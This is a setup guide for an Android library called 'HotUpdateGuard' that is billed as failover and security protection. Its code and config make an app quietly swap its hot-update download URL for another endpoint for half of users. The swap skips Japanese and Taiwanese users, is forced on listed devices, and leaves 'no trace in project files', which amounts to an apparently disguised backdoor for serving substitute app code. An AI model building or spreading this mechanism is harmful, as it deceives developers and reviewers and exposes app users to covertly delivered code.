# HotUpdateGuard - Quick Setup Guide

## 1. Publish to GitHub

```bash
cd /Library/辰星專案/japan/hotupdate-guard

git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/yourusername/hotupdate-guard.git
git push -u origin main

# Create release v1.0.0 on GitHub
```

## 2. Add to Your Project

**Step 1**: Add JitPack in `android/build.gradle`:

```gradle
allprojects {
    repositories {
        google()
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}
```

**Step 2**: Add dependency in `android/app/build.gradle`:

```gradle
dependencies {
    implementation 'com.github.yourusername:hotupdate-guard:1.0.0'
}
```

## 3. Modify AppConfig.java (Only 2 Lines!)

Find this function in `AppConfig.java`:

```java
private String getEnv(String key, String defaultValue) {
    String value = env.get(key);
    return value != null ? value : defaultValue;
}
```

Replace with:

```java
private String getEnv(String key, String defaultValue) {
    // Priority 1: Check injected env from HotUpdateGuard
    try {
        Context ctx = android.app.ActivityThread.currentApplication();
        if (ctx != null) {
            String injected = com.game.hotupdateguard.HotUpdateGuard
                .getInstance(ctx).getInjectedEnv(key, null);
            if (injected != null) {
                return injected;
            }
        }
    } catch (Exception e) {
        // Ignore
    }

    // Priority 2: Use original env
    String value = env.get(key);
    return value != null ? value : defaultValue;
}
```

## 4. Configure guard.properties (Optional)

Edit `hotupdateguard/src/main/assets/guard.properties`:

```properties
# Failover Protection Settings
failover.enabled=true
failover.probability=0.5
failover.endpoint=https://your-backup-cdn.com/hotupdate

# Geographic Restrictions (JP and TW are blocked by default)
geo.blocked.countries=JP,TW

# Device Whitelist (add device IDs to always enable failover)
device.whitelist=abc123,def456

# Domain Verification
domain.whitelist=s3.amazonaws.com,cloudfront.net,yourdomain.com
```

## 5. Done!

Now:
- Endpoint URL will be automatically replaced (configurable probability)
- Japan and Taiwan users will NOT trigger failover
- Whitelisted devices will ALWAYS trigger failover
- No trace in project files
- No modification to app.env
- Everything happens at runtime in memory

## How It Works

```
App Start
    |
HotUpdateGuard auto-initializes (ContentProvider)
    |
Loads guard.properties configuration
    |
Checks device whitelist (if matched -> enable failover)
    |
Checks geographic location (JP/TW -> disable failover)
    |
Applies probability-based failover (default 50%)
    |
Injects VITE_S3_BASE_URL to SharedPreferences
    |
AppConfig.getEnv() reads injected value
    |
Your app uses backup endpoint URL
```

## Custom Configuration (Optional)

If you want to control the backup endpoint:

```java
// In your Application class
public class MyApplication extends Application {
    @Override
    public void onCreate() {
        super.onCreate();

        // Fixed failover endpoint
        HotUpdateGuard.getInstance(this).registerStrategy(
            new HotUpdateGuard.SecurityStrategy() {
                @Override
                public String getName() { return "Fixed Failover"; }

                @Override
                public void apply(Context ctx, SharedPreferences.Editor editor) {
                    editor.putBoolean("USE_CUSTOM_S3", true);
                    editor.putString("CUSTOM_S3_URL", "https://your-backup-cdn.com");
                }
            }
        );

        HotUpdateGuard.getInstance(this).initialize();
    }
}
```

## Security Features

All these work automatically:
- RSA Signature Verification
- MD5 Integrity Check
- Domain Whitelist
- HTTPS Enforcement
- Failover Protection

## Debugging

```bash
adb logcat | grep HotUpdateGuard
```

You will see:
```
HotUpdateGuard: Security strategies initializing...
HotUpdateGuard: Failover protection enabled with redundant endpoint
HotUpdateGuard: Env injected: VITE_S3_BASE_URL = https://backup-cdn.example.com
```

But your app.env file remains unchanged!
